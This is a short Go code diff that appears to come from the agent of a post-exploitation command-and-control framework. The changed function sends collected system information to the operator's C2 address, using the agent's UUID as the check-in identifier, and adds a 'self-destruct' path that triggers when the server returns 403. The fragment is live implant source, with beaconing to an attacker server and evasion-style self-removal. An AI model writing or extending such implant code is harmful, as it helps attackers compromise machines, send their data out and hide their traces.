@@ -30,11 +30,17 @@ func ReportStatus(info *def.Emp3r0rAgent) (err error) {
 	if checkinPath == "" {
 		checkinPath = transport.CheckInAPI
 	}
-	reportStatusURL := netutil.JoinURL(def.CCAddress, checkinPath, uuid.NewString())
+	// If UUID is valid, use it.
+	// If empty, the checkin will fail with 404 because the URL will be incomplete (/api/checkin/),
+	// or the server will reject it. This is intended.
+	reportStatusURL := netutil.JoinURL(def.CCAddress, checkinPath, info.UUID)
 	logging.Printf("Collected system info, now reporting status (%s)", reportStatusURL)
 
 	conn, _, _, err := EstablishC2Connection(reportStatusURL)
 	if err != nil {
+		if strings.Contains(err.Error(), "bad status code: 403") {
+			return fmt.Errorf("self-destruct")
+		}
 		return err
 	}
 	defer conn.Close()
